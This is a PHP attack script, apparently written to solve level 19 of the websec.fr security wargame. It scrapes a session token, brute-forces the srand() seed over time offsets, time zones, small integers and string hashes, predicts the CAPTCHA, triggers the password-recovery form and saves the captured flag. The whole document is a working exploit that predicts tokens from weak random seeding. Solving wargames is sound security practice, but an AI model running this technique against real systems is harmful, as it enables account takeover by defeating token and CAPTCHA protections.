<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    ULTIMATE COMBINED ATTACK - All strategies               ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

$attempt = 0;

while (true) {
    $attempt++;
    
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        sleep(1);
        continue;
    }
    
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) continue;
    $session_id = $matches[1];
    
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) continue;
    $real_token = $token_match[1];
    
    $now = time();
    
    echo "[$attempt] Token: " . substr($real_token, 0, 10) . "... @ " . date('H:i:s') . "\n";
    
    // ESTRATEGIA COMBINADA: probar TODOS estos enfoques
    $all_seeds = [];
    
    // 1. Rango temporal amplio
    for ($offset = -10800; $offset <= 3600; $offset += 1) {
        $all_seeds[] = $now + $offset;
    }
    
    // 2. Timezones
    for ($tz = -12; $tz <= 12; $tz++) {
        $tz_time = $now + ($tz * 3600);
        for ($offset = -60; $offset <= 60; $offset++) {
            $all_seeds[] = $tz_time + $offset;
        }
    }
    
    // 3. Seeds pequeños
    for ($i = 0; $i < 50000; $i++) {
        $all_seeds[] = $i;
    }
    
    // 4. Hashes comunes
    $strings = ['websec', 'level19', 'captcha', 'php', 'random'];
    foreach ($strings as $str) {
        $all_seeds[] = crc32($str);
        $all_seeds[] = abs(crc32($str));
    }
    
    // 5. Milisegundos/microsegundos
    $all_seeds[] = intval($now * 1000);
    $all_seeds[] = intval($now * 1000000) % 2147483647;
    
    // Eliminar duplicados y ordenar para eficiencia
    $all_seeds = array_unique($all_seeds);
    
    $tested = 0;
    $matches_found = 0;
    
    foreach ($all_seeds as $seed) {
        srand($seed);
        $test_token = generate_random_text(32);
        $tested++;
        
        if ($test_token === $real_token) {
            $matches_found++;
            echo "\n  ✓✓✓ MATCH #$matches_found! Seed: $seed ✓✓✓\n";
            
            srand($seed);
            generate_random_text(32);
            $captcha = generate_random_text(25);
            
            echo "  CAPTCHA: $captcha\n";
            
            $post_data = http_build_query([
                'captcha' => $captcha,
                'token' => $real_token,
                'submit' => ''
            ]);
            
            $ch = curl_init("https://websec.fr/level19/index.php");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
            $result = curl_exec($ch);
            curl_close($ch);
            
            if (strpos($result, 'Password recovery email sent') !== false) {
                echo "\n╔════════════════════════════════════════════════════════════╗\n";
                echo "║                   🎉 SUCCESS! 🎉                         ║\n";
                echo "╠════════════════════════════════════════════════════════════╣\n";
                
                if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                    echo "║  FLAG: " . str_pad($flag_match[0], 49) . "║\n";
                    file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
                    echo "╚════════════════════════════════════════════════════════════╝\n";
                    exit(0);
                } else {
                    echo "║  Flag was emailed to level19@websec.fr                    ║\n";
                    echo "╚════════════════════════════════════════════════════════════╝\n";
                }
            } else {
                echo "  Seed matched but submission failed\n";
            }
            break;
        }
        
        if ($tested % 5000 == 0) {
            echo "  Progress: $tested/" . count($all_seeds) . "\n";
        }
    }
    
    echo "  Tested $tested seeds total\n\n";
}
?>